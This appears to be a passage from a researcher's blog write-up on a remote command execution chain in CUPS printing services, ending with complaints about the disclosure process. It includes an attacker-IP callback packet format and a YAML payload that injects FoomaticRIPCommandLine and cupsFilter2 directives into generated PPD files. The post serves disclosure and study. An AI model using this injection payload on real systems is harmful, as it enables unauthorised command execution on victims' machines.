<p>Both these issues <a target="_blank" rel="noopener" href="https://github.com/OpenPrinting/cups-browsed/security/advisories/GHSA-rj88-6mr5-rcw8#advisory-comment-109538">have been reported and thoroughly documented</a>, to the devs <em>and</em> the CERT, but nobody seemed to give a damn. I can tell you that there‚Äôre other, more easily exploitable code paths going on, not just in the discovery mechanism - also reported and ignored. To this day they have not been acknowledged or patched. Happy hunting.</p>
<p>However, I‚Äôm a bit lazy and most importantly I‚Äôm a noob when it comes to binary exploitation. Hell, I can barely tell whether a buffer overflow or a race condition are exploitable or not. Hardening mechanisms are getting more and more complex to bypass and to be honest I had no intention of spending months on this stuff - I hate printers. So for the moment I decided to move on to what seemed to be a lower hanging fruit.</p>
<h2 id="Back-to-found-cups-printer"><a href="#Back-to-found-cups-printer" class="headerlink" title="Back to found_cups_printer"></a>Back to found_cups_printer</h2><p>By looking at <a target="_blank" rel="noopener" href="https://github.com/OpenPrinting/cups-browsed/blob/c12b9cf5a906ab16971f5d060f291f9a58edadac/daemon/cups-browsed.c#L11686C1-L11720C36">found_cups_printer</a> we can see that one of the two text fields parsed from the packet is a URL:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// A CUPS printer has been discovered via CUPS Browsing</span></span><br><span class="line"><span class="comment">// or with BrowsePoll</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">found_cups_printer(<span class="keyword">const</span> <span class="keyword">char</span> *remote_host,</span><br><span class="line">		   <span class="keyword">const</span> <span class="keyword">char</span> *uri,</span><br><span class="line">		   <span class="keyword">const</span> <span class="keyword">char</span> *location,</span><br><span class="line">		   <span class="keyword">const</span> <span class="keyword">char</span> *info)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// ... initialization skipped ...</span></span><br><span class="line"></span><br><span class="line">  httpSeparateURI(HTTP_URI_CODING_ALL, uri,</span><br><span class="line">		  scheme, <span class="keyword">sizeof</span>(scheme) - <span class="number">1</span>,</span><br><span class="line">		  username, <span class="keyword">sizeof</span>(username) - <span class="number">1</span>,</span><br><span class="line">		  host, <span class="keyword">sizeof</span>(host) - <span class="number">1</span>,</span><br><span class="line">		  &amp;port,</span><br><span class="line">		  resource, <span class="keyword">sizeof</span>(resource)- <span class="number">1</span>);</span><br></pre></td></tr></table></figure>

<p>After some further validation and parsing, this URL and other data are then passed as arguments to the <a target="_blank" rel="noopener" href="https://github.com/OpenPrinting/cups-browsed/blob/c12b9cf5a906ab16971f5d060f291f9a58edadac/daemon/cups-browsed.c#L10211">examine_discovered_printer_record function</a>, which ultimately executes <a target="_blank" rel="noopener" href="https://github.com/OpenPrinting/cups-browsed/blob/c12b9cf5a906ab16971f5d060f291f9a58edadac/daemon/cups-browsed.c#L7644">create_remote_printer_entry</a>. The <code>create_remote_printer_entry</code> function will then call <a target="_blank" rel="noopener" href="https://github.com/OpenPrinting/cups-browsed/blob/c12b9cf5a906ab16971f5d060f291f9a58edadac/daemon/cups-browsed.c#L7828">cfGetPrinterAttributes</a> from <code>libcupsfilters</code>:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// For a remote CUPS printer our local queue will be raw or get a</span></span><br><span class="line"><span class="comment">// PPD file from the remote CUPS server, so that the driver on the</span></span><br><span class="line"><span class="comment">// remote CUPS server gets used. So we will not generate a PPD file</span></span><br><span class="line"><span class="comment">// or interface script at this point.</span></span><br><span class="line">p-&gt;netprinter = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (p-&gt;uri[<span class="number">0</span>] != <span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    p-&gt;prattrs = cfGetPrinterAttributes(p-&gt;uri, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">    debug_log_out(cf_get_printer_attributes_log);</span><br><span class="line">    <span class="keyword">if</span> (p-&gt;prattrs == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        debug_printf(<span class="string">&quot;get-printer-attributes IPP call failed on printer %s (%s).\n&quot;</span>,</span><br><span class="line">            p-&gt;queue_name, p-&gt;uri);</span><br><span class="line">        <span class="keyword">goto</span> fail;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>To understand what this means, we‚Äôll need to briefly mention what the IPP protocol is, but for now the key points are:</p>
<ul>
<li>A packet containing any URL, in the form of <code>0 3 http://&lt;ATTACKER-IP&gt;:&lt;PORT&gt;/printers/whatever</code>, gets to UDP port 631</li>
<li>This triggers a sequence of events that result in cups-browsed connecting to that URL, a drive-by kind of thing.</li>
</ul>
<p>So I tell to myself: <em>there‚Äôs no freaking way that if I send this packet to a public IP running CUPS (thank you shodan.io), that computer will connect back to the server I specified. No way.</em> </p>
<p>I hack some python code together, fire up a VPS and try anyway.</p>
<p><img src="/images/2024/cups1/passive_info.png" alt="leak"></p>
<p>HOLY SH!!!!! Not only it connected back immediately, but it also reported the exact kernel version and architecture in the User-Agent header! We‚Äôll see later how this protocol also reports the requesting username (on the target) for some requests. Also this aspect, that to me <a target="_blank" rel="noopener" href="https://cwe.mitre.org/data/definitions/200.html">matches pretty well with CWE-200</a>, has been reported and just scoffed off as  part of the mechanism. Alright ‚Ä¶ let‚Äôs not waste time on arguing whether or not this is a problem, let‚Äôs get to the juicy stuff. We know that this thing talks HTTP and POSTs some semi binary payload, what the hell is that?</p>
<h2 id="Internet-Printing-Protocol"><a href="#Internet-Printing-Protocol" class="headerlink" title="Internet Printing Protocol"></a>Internet Printing Protocol</h2><p>The <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Internet_Printing_Protocol">Internet Printing Protocol</a>, in short IPP, <em>is a specialized communication protocol for communication between client devices (computers, mobile phones, tablets, etc.) and printers (or print servers). It allows clients to submit one or more print jobs to the network-attached printer or print server, and perform tasks such as querying the status of a printer, obtaining the status of print jobs, or cancelling individual print jobs.</em></p>
<p>Essentially, the system now believes that we are a printer and it is sending us, encapsulated in HTTP, a <a target="_blank" rel="noopener" href="https://ftp.pwg.org/pub/pwg/ipp/registrations/reg-ippgupa-20171214.pdf">Get-Printer-Attributes</a> request in order to fetch printer attributes such as the model, vendor and several others. It makes sense, the system discovered a new printer and somehow it has to know what it is. Well ‚Ä¶</p>
<p><img src="/images/2024/cups1/im_your_printer.jpg" alt="i&#39;m your printer now"></p>
<p>I went back to writing some code and, by using the <a target="_blank" rel="noopener" href="https://github.com/h2g2bob/ipp-server">ippserver python package</a> I was now able to respond properly, with attributes I controlled, to the service request. My fake printer was immediately added to the local printers with no notification whatsoever to the user.</p>
<p><img src="/images/2024/cups1/god.jpg" alt="omg"></p>
<p>AMAZING! üéâü•≥üéâ</p>
<p>What can we do with this? At this point I enabled debug logs in the service so I could observe what was going on when my fake printer was being discovered and added, and noticed these lines:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">Wed Sep  4 13:15:32 2024 127517144909504 Creating permanent CUPS queue God_192_168_50_19.</span><br><span class="line">Wed Sep  4 13:15:32 2024 127517144909504 Loading saved printer options for God_192_168_50_19 from &#x2F;var&#x2F;cache&#x2F;cups-browsed&#x2F;cups-browsed-options-God_192_168_50_19</span><br><span class="line">Wed Sep  4 13:15:32 2024 127517144909504 Failed reading file &#x2F;var&#x2F;cache&#x2F;cups-browsed&#x2F;cups-browsed-options-God_192_168_50_19, probably no options recorded yet</span><br><span class="line">Wed Sep  4 13:15:32 2024 127517144909504 Print queue God_192_168_50_19 is for remote CUPS queue(s) and we get notifications from CUPS, using implicit class device URI implicitclass:&#x2F;&#x2F;God_192_168_50_19&#x2F;</span><br><span class="line">Wed Sep  4 13:15:32 2024 127517144909504 PPD generation successful: PDF PPD generated.</span><br><span class="line">Wed Sep  4 13:15:32 2024 127517144909504 Created temporary PPD file: &#x2F;tmp&#x2F;00f9466d902dc</span><br><span class="line">Wed Sep  4 13:15:32 2024 127517144909504 Using PPD &#x2F;tmp&#x2F;00f9466d902dc for queue God_192_168_50_19.</span><br><span class="line">Wed Sep  4 13:15:32 2024 127517144909504 Editing PPD file &#x2F;tmp&#x2F;00f9466d902dc for printer God_192_168_50_19, setting the option defaults of the previous cups-browsed session and doing client-side filtering of the job, saving the resulting PPD in &#x2F;tmp&#x2F;00f9466d9231e.</span><br><span class="line">Wed Sep  4 13:15:32 2024 127517144909504 Non-raw queue God_192_168_50_19 with PPD file: &#x2F;tmp&#x2F;00f9466d9231e</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>Wait what?! It looks like the service fetches these attributes and then creates some sort of temporary file, a ‚ÄúPPD‚Äù, on which these attributes are possibly saved.</p>
<p>If we search for the <code>PPD generation successful</code> string that appears in the logs, we find ourselves in the <a target="_blank" rel="noopener" href="https://github.com/OpenPrinting/cups-browsed/blob/c12b9cf5a906ab16971f5d060f291f9a58edadac/daemon/cups-browsed.c#L8622-L8650">create_queue function</a>, where we can see how the attributes are passed to the <code>ppdCreatePPDFromIPP2</code> API in <code>libppd</code>:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// If we do not want CUPS-generated PPDs or we cannot obtain a</span></span><br><span class="line"><span class="comment">// CUPS-generated PPD, for example if CUPS does not create a</span></span><br><span class="line"><span class="comment">// temporary queue for this printer, we generate a PPD by</span></span><br><span class="line"><span class="comment">// ourselves</span></span><br><span class="line">printer_ipp_response = (num_cluster_printers == <span class="number">1</span>) ? p-&gt;prattrs :</span><br><span class="line">printer_attributes;</span><br><span class="line"><span class="keyword">if</span> (!ppdCreatePPDFromIPP2(ppdname, <span class="keyword">sizeof</span>(ppdname), printer_ipp_response,</span><br><span class="line">        make_model,</span><br><span class="line">        pdl, color, duplex, conflicts, sizes,</span><br><span class="line">        default_pagesize, default_color,</span><br><span class="line">        ppdgenerator_msg, <span class="keyword">sizeof</span>(ppdgenerator_msg)))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (errno != <span class="number">0</span>)</span><br><span class="line">        debug_printf(<span class="string">&quot;Unable to create PPD file: %s\n&quot;</span>,</span><br><span class="line">            strerror(errno));</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        debug_printf(<span class="string">&quot;Unable to create PPD file: %s\n&quot;</span>,</span><br><span class="line">            ppdgenerator_msg);</span><br><span class="line">    p-&gt;status = STATUS_DISAPPEARED;</span><br><span class="line">    current_time = time(<span class="literal">NULL</span>);</span><br><span class="line">    p-&gt;timeout = current_time + TIMEOUT_IMMEDIATELY;</span><br><span class="line">    <span class="keyword">goto</span> end;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    debug_printf(<span class="string">&quot;PPD generation successful: %s\n&quot;</span>, ppdgenerator_msg);</span><br><span class="line">    debug_printf(<span class="string">&quot;Created temporary PPD file: %s\n&quot;</span>, ppdname);</span><br><span class="line">    ppdfile = strdup(ppdname);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>We finally get to libppd, where the <a target="_blank" rel="noopener" href="https://github.com/OpenPrinting/libppd/blob/0d90320157135b9ec585617e1545793b274c7f82/ppd/ppd-generator.c#L182">ppdCreatePPDFromIPP2 API</a> is used to <a target="_blank" rel="noopener" href="https://github.com/OpenPrinting/libppd/blob/0d90320157135b9ec585617e1545793b274c7f82/ppd/ppd-generator.c#L353">save some of those attacker controlled text attributes</a> to a file with a very specific, line oriented syntax, without any sanitization whatsoever:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((attr = ippFindAttribute(supported, <span class="string">&quot;printer-make-and-model&quot;</span>,</span><br><span class="line">			       IPP_TAG_TEXT)) != <span class="literal">NULL</span>)</span><br><span class="line">    strlcpy(make, ippGetString(attr, <span class="number">0</span>, <span class="literal">NULL</span>), <span class="keyword">sizeof</span>(make));</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (make_model &amp;&amp; make_model[<span class="number">0</span>] != <span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line">    strlcpy(make, make_model, <span class="keyword">sizeof</span>(make));</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    strlcpy(make, <span class="string">&quot;Unknown Printer&quot;</span>, <span class="keyword">sizeof</span>(make));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!strncasecmp(make, <span class="string">&quot;Hewlett Packard &quot;</span>, <span class="number">16</span>) ||</span><br><span class="line">      !strncasecmp(make, <span class="string">&quot;Hewlett-Packard &quot;</span>, <span class="number">16</span>))</span><br><span class="line">  &#123;</span><br><span class="line">    model = make + <span class="number">16</span>;</span><br><span class="line">    strlcpy(make, <span class="string">&quot;HP&quot;</span>, <span class="keyword">sizeof</span>(make));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ((model = <span class="built_in">strchr</span>(make, <span class="string">&#x27; &#x27;</span>)) != <span class="literal">NULL</span>)</span><br><span class="line">    *model++ = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    model = make;</span><br><span class="line"></span><br><span class="line">  cupsFilePrintf(fp, <span class="string">&quot;*Manufacturer: \&quot;%s\&quot;\n&quot;</span>, make);             <span class="comment">// &lt;--- LOL</span></span><br><span class="line">  cupsFilePrintf(fp, <span class="string">&quot;*ModelName: \&quot;%s %s\&quot;\n&quot;</span>, make, model);      <span class="comment">// &lt;--- LOL</span></span><br><span class="line">  cupsFilePrintf(fp, <span class="string">&quot;*Product: \&quot;(%s %s)\&quot;\n&quot;</span>, make, model);      <span class="comment">// &lt;--- LOL</span></span><br><span class="line">  cupsFilePrintf(fp, <span class="string">&quot;*NickName: \&quot;%s %s, %sdriverless, %s\&quot;\n&quot;</span>,</span><br><span class="line">		 make, model, (is_fax ? <span class="string">&quot;Fax, &quot;</span> : <span class="string">&quot;&quot;</span>), VERSION);</span><br><span class="line">  cupsFilePrintf(fp, <span class="string">&quot;*ShortNickName: \&quot;%s %s\&quot;\n&quot;</span>, make, model);  <span class="comment">// &lt;--- LOL</span></span><br></pre></td></tr></table></figure>

<p>Notice how many attributes are fprintf‚Äôed, unescaped, into the file. The <code>printer-make-and-model</code> is just <strong>one</strong> of them. So, <strong>what the hell is a PPD file now?</strong></p>
<p>NOTE: These two API are also used in other parts of the overall CUPS system, not just the discovery. IYKWIM.</p>
<h2 id="PostScript-Printer-Description"><a href="#PostScript-Printer-Description" class="headerlink" title="PostScript Printer Description"></a>PostScript Printer Description</h2><p><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/PostScript_Printer_Description">PostScript Printer Description (PPD)</a> files <em>are created by vendors to describe the entire set of features and capabilities available for their PostScript printers.</em><br><em>A PPD also contains the PostScript code (commands) used to invoke features for the print job. As such, PPDs function as drivers for all PostScript printers, by providing a unified interface for the printer‚Äôs capabilities and features.</em></p>
<p>So a PPD file is a text file provided by a vendor that describes in a domain specific language the printer capabilities to CUPS and instructs it on how to use it properly. It looks something like this:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">*% &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">*% Basic Device Capabilities</span><br><span class="line">*% &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">*LanguageLevel: &quot;2&quot;</span><br><span class="line">*ColorDevice: True</span><br><span class="line">*DefaultColorSpace: CMYK</span><br><span class="line">*TTRasterizer: Type42</span><br><span class="line">*FileSystem: False</span><br><span class="line">*Throughput: &quot;10&quot;</span><br></pre></td></tr></table></figure>

<p>And there are <strong>tons</strong> of different instructions that are supported and can be used to do all sorts of things. I spent a few hours <a target="_blank" rel="noopener" href="https://web.mit.edu/PostScript/Adobe/Documents/5003.PPD_Spec_v4.3.pdf">just reading the PPD specs</a> (thank you MIT), and studying the <a target="_blank" rel="noopener" href="https://www.cups.org/doc/spec-ppd.html">CUPS specific extensions</a> in order to find something I could rely to perform an attack. And then I found about the <code>cupsFilter2</code> directive:</p>
<p><img src="/images/2024/cups1/cupsfilter2.png" alt="cupsFilter2"></p>
<p>A filter is any executable contained in the <code>/usr/lib/cups/filter</code> path (CUPS <em>does</em> check this, you can‚Äôt specify <em>any</em> binary), which will get executed when a print job is sent to the printer, in order to perform some document conversion if the printer doesn‚Äôt support that specific format. So, given that we have a constraint on which binary we can execute, we need to find a way to leverage one of the existing filters to run arbitrary commands. And also bypass <a target="_blank" rel="noopener" href="https://github.com/OpenPrinting/cups-browsed/blob/c12b9cf5a906ab16971f5d060f291f9a58edadac/daemon/cups-browsed.c#L8939">these checks here</a>, which only takes a space before the colon.</p>
<h2 id="The-problematic-child-foomatic-rip"><a href="#The-problematic-child-foomatic-rip" class="headerlink" title="The problematic child: foomatic-rip"></a>The problematic child: foomatic-rip</h2><p>Another search revealed pretty quickly what could be defined as the <em>necessary evil</em> of the CUPS family, the <a target="_blank" rel="noopener" href="https://linux.die.net/man/1/foomatic-rip">foomatic-rip filter</a>. This executable has a long history of being leveraged for exploitation, starting from the first known (to me at least) <a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2011-2964">CVE-2011-2964</a> and <a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2011-2697">CVE-2011-2697</a> back in 2011. The filter accepted the <code>FoomaticRIPCommandLine</code> directive in the PPD that would allow ANY command to be executed through it. Nice!</p>
<p>According to the records, <a target="_blank" rel="noopener" href="https://github.com/Distrotech/foomatic-filters/commit/20f05ab502d9e7a5bef58de16eca82d3745a7ad9">this is the commit</a> that fixed those CVEs. However, you might have noticed that this package is different and it‚Äôs called <code>foomatic-filters</code>. When <a target="_blank" rel="noopener" href="https://unix.stackexchange.com/questions/378557/what-is-the-difference-between-cups-filters-and-foomatic-filters">foomatic-filters was integrated in the CUPS system</a>, this fix was <strong>not</strong> ported to CUPS, as it is possible to verify by the <code>--ppd argument</code>, initially removed as part of the fix, and <a target="_blank" rel="noopener" href="https://github.com/OpenPrinting/cups-filters/blob/90f04657ad3cac36ca1bfa96f62f3878166bc8f6/filter/foomatic-rip/foomaticrip.c#L983">still present in the code today</a>. And in fact, we can find mentions of the <code>FoomaticRIPCommandLine</code> directive being leveraged for arbitrary command execution in the more recent <a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2024-35235">CVE-2024-35235</a>. </p>
<p>So apparently <code>foomatic-rip</code> was a known issue (confirmed by the CUPS devs), but somehow it has not been fixed for ‚Ä¶ decades? <strong>Why is something that allows arbitrary commands in a generally untrusted context not considered a security issue worth fixing?</strong> I‚Äôll tell you why! Because <strong>it‚Äôs very hard to fix</strong>. According to the CUPS developers:</p>
<blockquote>
<p>‚Ä¶ it is very difficult to limit what can be provided in the FoomaticRIPCommandLine line in the PPD file. REDACTED and the rest of the OpenPrinting team have been talking about ways to limit what can be done through Foomatic without breaking existing drivers - we can certainly recommend that people not use Foomatic, but there are likely hundreds of older printer models (before 2010) that are only supported through Foomatic.</p>
</blockquote>
<p>And many of those hundreds of models, really use this directive <a target="_blank" rel="noopener" href="https://github.com/search?q=repo:OpenPrinting/foomatic-db%20foomaticripcommandline&type=code">in creative ways</a> such as:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">*FoomaticRIPCommandLine: &quot;(printf &amp;apos;\033%%-12345X@PJL\n@PJL JOB\n@PJL SET COPIES&#x3D;&amp;copies;\n&amp;apos;%G|perl -p -e &quot;s&#x2F;\x26copies\x3b&#x2F;1&#x2F;&quot;);</span><br><span class="line">(gs -q -dBATCH -dPARANOIDSAFER -dNOPAUSE -dNOINTERPOLATE %B%A%C %D%E | perl -p -e &quot;s&#x2F;^\x1b\x25-12345X&#x2F;&#x2F;&quot; | perl -p -e &quot;s&#x2F;\xc1\x01\x00\xf8\x31\x44&#x2F;\x44&#x2F;g&quot;);</span><br><span class="line">(printf &amp;apos;@PJL\n@PJL EOJ\n\033%%-12345X&amp;apos;)&quot;</span><br></pre></td></tr></table></figure>

<p>I had no idea that this can happen every time you print something, and to be frank it‚Äôs quite scary. They <strong>have</strong> to allow <code>FoomaticRIPCommandLine</code> to accept pretty much anything (including perl as you can see), or many printers will just stop working on UNIX.</p>
<h2 id="Remote-Command-Execution-chain"><a href="#Remote-Command-Execution-chain" class="headerlink" title="Remote Command Execution chain"></a>Remote Command Execution chain</h2><p>So, in theory, we should now be able to:</p>
<ul>
<li>Force the target machine to connect back to our malicious IPP server.</li>
<li>Return an IPP attribute string that will inject controlled PPD directives to the temporary file.</li>
<li>Wait for a print job to be sent to our fake printer for the PPD directives, and therefore the command, to be executed.</li>
</ul>
<p>Shall we? This is the configuration payload for the IPP server (this is a YAML file that you will be able to use with the next bettercap release and its new <code>zeroconf</code> and <code>ipp</code> modules):</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ... other configuration removed for brevity ...</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># enables the IPP server</span></span><br><span class="line"><span class="attr">ipp:</span></span><br><span class="line">    <span class="comment"># this can be the name of an existing device</span></span><br><span class="line">    <span class="comment"># in which case its original IPP record will be transparently hijacked</span></span><br><span class="line">    <span class="attr">printer-name:</span> <span class="string">EVIL_PRINTER</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># where the magic happens, it&#x27;s important to preserve the new lines</span></span><br><span class="line">    <span class="attr">printer-privacy-policy-uri:</span> <span class="string">|</span></span><br><span class="line">        <span class="string">https://www.google.com/&quot;</span></span><br><span class="line">        <span class="string">*FoomaticRIPCommandLine:</span> <span class="string">&quot;echo 1 &gt; /tmp/PWNED&quot;</span></span><br><span class="line">        <span class="string">*cupsFilter2</span> <span class="string">:</span> <span class="string">&quot;application/pdf application/vnd.cups-postscript 0 foomatic-rip</span></span><br></pre></td></tr></table></figure>

<p>You can see how we‚Äôre returning a <code>printer-privacy-policy-uri</code> attribute string (it can be any of the many attributes saved to the PPD) that will:</p>
<ol>
<li>Set <code>printer-privacy-policy-uri</code> to <code>&quot;https://www.google.com/&quot;</code>, close the PPD string with the double quote, and add a new line.</li>
<li>Inject the <code>*FoomaticRIPCommandLine: &quot;echo 1 &gt; /tmp/PWNED&quot;</code> line with our command in the PPD.</li>
<li>Inject the <code>*cupsFilter2 : &quot;application/pdf application/vnd.cups-postscript 0 foomatic-rip</code> line (notice the spaces before and after the colon and no closing double quotes) directive to instruct CUPS to execute <code>/usr/lib/cups/filter/foomatic-rip</code> (with our <code>FoomaticRIPCommandLine</code>) when a print job is sent.</li>
</ol>
<p><img src="/images/2024/cups1/mrrobot.gif" alt="finally"></p>
<p>In this video you can see me on my attacker machine (on the left) using the first version of this exploit to attack my new laptop, a fully patched <code>Ubuntu 24.04.1 LTS</code> running <code>cups-browsed 2.0.1</code>, and (finally!!!) achieving command execution:</p>
<p><video src="/images/2024/cups1/exploit.mp4" width="100%" controls></video></p>
<h2 id="Personal-Considerations"><a href="#Personal-Considerations" class="headerlink" title="Personal Considerations"></a>Personal Considerations</h2><p>You will maybe be thinking now <em>‚Äúwow, that‚Äôs a lot of stuff to read, code, RFCs, PDFs of forgotten standards, this research must have been so tiring‚Äù</em>, but in reality this was a weekend worth of rabbit holes, this was <strong>the fun part</strong>. The actual work, the heavy, boring stuff started when on September 5, after confirming my findings, I decided to open a security advisory on the OpenPrinting cups-browsed repository and do what to me was the right thing to do: responsible disclosure. </p>
<p>I won‚Äôt go into the details of the <a target="_blank" rel="noopener" href="https://github.com/OpenPrinting/cups-browsed/security/advisories/GHSA-rj88-6mr5-rcw8">initial conversation</a>, or the <a target="_blank" rel="noopener" href="https://github.com/OpenPrinting/libcupsfilters/security/advisories/GHSA-w63j-6g73-wmg5">ones</a> <a target="_blank" rel="noopener" href="https://github.com/OpenPrinting/libppd/security/advisories/GHSA-7xfx-47qg-grp6">that</a> <a target="_blank" rel="noopener" href="https://github.com/OpenPrinting/cups-filters/security/advisories/GHSA-p9rh-jxmq-gq47">followed</a>. You are free to read them (if they will ever open any of the threads and you are willing to read 50+ pages of conversations) or not, and make your own opinion. </p>
<p>While the research only took a couple of days, this part took 22. And this part was <strong>not</strong> fun. I will only say that to my personal experience, the responsible disclosure process is broken. That a lot is expected and taken for granted from the security researchers by triagers that behave like you have to ‚Äúprove to be worth listening to‚Äù while in reality they barely care to process and understand what you are saying, only to realize you were right all along three weeks later (if at all).</p>
<p>Two days for the research, 249 lines of text for the fully working exploit.</p>
<p>Twenty-two days of arguments, condescension, several <a target="_blank" rel="noopener" href="https://github.com/OpenPrinting/cups-browsed/issues/36">gaslighting attempts</a> (the things i‚Äôve read these days ‚Ä¶ you have <em>no idea</em>), more or less subtle personal attacks, dozens of emails and messages, more than 100 pages of text in total. Hours and hours and hours and hours and <em>fucking hours</em>. Not to mention somehow being judged by a big chunk of the infosec community with a tendency of talking and judging situations they simply don‚Äôt know.</p>
<p>Let that sink in for a moment ‚Ä¶ <strong>WTAF</strong>.</p>
<p>And we‚Äôre <strong>not</strong> talking about time spent on fixes while I was impatient and throwing a tantrum on twitter. The <em>actual fixes</em> (or a part of them) started being pushed much later. The vast majority of the time has been spent arguing whether or not these were issues worth considering. While I was trying to report that there‚Äôs something bad that should be addressed asap, the devs were being dismissive (and pushing other code, also vulnerable, for other functionalities instead of fixing) because I dared to criticize the design of their software. While at the same time I was trying to reach out privately to de-escalate and assure whoever was getting offended that my intent was not adversarial:</p>
<p><img src="/images/2024/cups1/email.jpg" alt="email"></p>
